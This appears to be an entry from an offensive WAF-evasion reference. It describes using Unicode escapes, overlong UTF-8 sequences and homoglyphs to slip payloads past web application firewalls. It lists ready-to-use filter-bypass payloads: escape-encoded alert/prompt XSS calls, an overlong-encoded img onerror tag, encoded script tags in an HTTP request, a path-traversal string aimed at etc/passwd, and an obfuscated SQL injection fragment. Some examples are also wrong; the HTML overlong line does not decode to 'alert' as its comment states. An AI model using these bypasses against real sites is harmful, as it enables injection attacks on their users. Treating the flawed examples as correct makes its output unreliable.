---
id: WAF-EVASION-05
title: Unicode Normalization
category: Evasion Techniques
severity_range: Low-Medium
owasp_ref: https://github.com/0xInfection/Awesome-WAF
---

# WAF-EVASION-05: Unicode Normalization

## Summary

Unicode normalization evasion exploits differences in how WAFs and target applications handle Unicode character representations. By encoding payload characters as Unicode escape sequences, UTF-8 overlong sequences, or Unicode homoglyphs, attackers can bypass WAF filters that lack proper Unicode normalization or decode input with a different normalization form than the backend.

## When to Use

- Against WAFs that do not normalize Unicode input to a standard form (NFC, NFD, NFKC, NFKD)
- When the backend application normalizes Unicode using a different form than the WAF
- Against WAFs that fail to decode UTF-8 overlong sequences or illegal UTF-8 encodings
- When the target uses JavaScript's `eval()`, `document.write()`, or `innerHTML` with unescaped Unicode

## Technique Details

Unicode encoding allows characters to be represented in multiple ways:

1. **Unicode Escape Sequences**: `\uXXXX` notation recognized by JavaScript and some parsers.
2. **UTF-8 Overlong Sequences**: Encoding a code point in more bytes than necessary (e.g., encoding `U+002F` `/` as `0xC0 0xAF` instead of `0x2F`).
3. **Unicode Homoglyphs**: Visually identical characters with different code points (e.g., Latin 'A' U+0041 vs Cyrillic 'А' U+0410).
4. **Compatibility Decomposition**: Using NFKD normalization to decompose characters before matching.

**JavaScript Unicode escapes** work because `\u0070` is equivalent to `p` in JavaScript string parsing. A WAF that checks for `prompt` may miss `\u0070rompt`.

**UTF-8 overlong sequences** are rejected by strict Unicode parsers but incorrectly accepted by some WAF implementations, allowing encoded characters to slip through.

## Payload Examples

```javascript
// Unicode escape sequences in JavaScript
\u0070\u0072\u006f\u006d\u0070\u0074(1)
// Decodes to: prompt(1)

\u0061\u006c\u0065\u0072\u0074(1)
// Decodes to: alert(1)

eval("\u0061\u006c\u0065\u0072\u0074(1)")
// Decodes to: eval("alert(1)")

// Mixed Unicode escapes
\x61l\x65rt(1)
// Hex escape: alert(1)

\u0061l\u0065rt(1)
// Decodes to: alert(1)
```

```html
<!-- UTF-8 overlong sequences in HTML -->
<img src=x onerror=&#xC0;&#xBC;&#xC0;&#xA0;&#xC0;&#xBC;&#xC0;&#xAE;&#xC0;&#xB2;&#xC0;&#xBC;&#xC0;&#xB4;(1)>
<!-- Overlong encoding of 'alert' -->
```

```python
# Python unicode normalization bypass
# If WAF normalizes as NFC but backend uses NFKD:
payload = "\u0041\u0300"  # A + combining grave
# NFC: À (U+00C0)
# NFKD: A + grave (decomposed)
```

```http
# URL-encoded Unicode
GET /search?q=%C0%BCscript%C0%BE HTTP/1.1
Host: target.com
# Overlong encoding of '<' and '>'
```

## Detection & Bypass Notes

**Detection:**
- WAFs with Unicode normalization (NFC/NFKC) before matching are resistant to this technique.
- Overlong sequences should be rejected by specification-compliant UTF-8 decoders; WAFs blocking them is expected.
- Behavioral detection of decoded output can catch Unicode-normalized payloads post-decoding.

**Bypass:**
- Combine Unicode escapes with other techniques: `\u0075n\u0069on\u0020sel\u0065ct` (SQLi via JavaScript eval).
- Use `String.fromCharCode()` as an additional obfuscation layer over Unicode escapes.
- Test different normalization forms (NFC, NFD, NFKC, NFKD) against the target.
- Unicode normalization in path components (`/..%C0%AF..%C0%AFetc%C0%AFpasswd`) can bypass path-based filters.

## References

- https://github.com/0xInfection/Awesome-WAF
- https://unicode.org/reports/tr15/
- https://tools.ietf.org/html/rfc3629
- https://www.unicode.org/charts/
